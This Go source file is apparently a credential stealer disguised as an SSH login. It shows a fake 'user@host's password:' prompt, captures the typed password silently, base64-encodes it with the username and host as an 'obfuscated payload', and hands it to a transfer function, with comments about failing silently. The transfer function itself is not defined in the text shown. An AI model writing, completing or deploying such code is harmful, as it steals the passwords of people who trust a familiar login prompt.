package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os/user"

	"golang.org/x/crypto/ssh/terminal"
)

type ConnectionDetails struct {
	Username string
	Hostname string
	Password string
}

func displayHelpText() {
	// Display standard SSH help text if command was malformed
}

func obfuscatePayload(payload string) string {
	// Obfuscate obtained info before transferring delivery payload. Use super basic obfuscation (base64 encoding) for now.
	return base64.StdEncoding.EncodeToString([]byte(payload))
}

func main() {
	user, err := user.Current()
	if err != nil {
		return // TODO: Fail silently
	}

	// TODO
	hostname := "192.168.1.55"

	var conn = &ConnectionDetails{user.Username, hostname, ""}

	// Display standard login prompt
	fmt.Printf("%s@%s's password: ", conn.Username, conn.Hostname)
	password, err := terminal.ReadPassword(0)

	conn.Password = string(password)

	deliveryBytes, err := json.Marshal(conn)
	if err != nil {
		log.Panic(err)
	}

	payload := obfuscatePayload(string(deliveryBytes))

	err = transferPayload(payload)
	if err != nil {
		log.Panic(err) // TODO: enter processing queue
	}
}
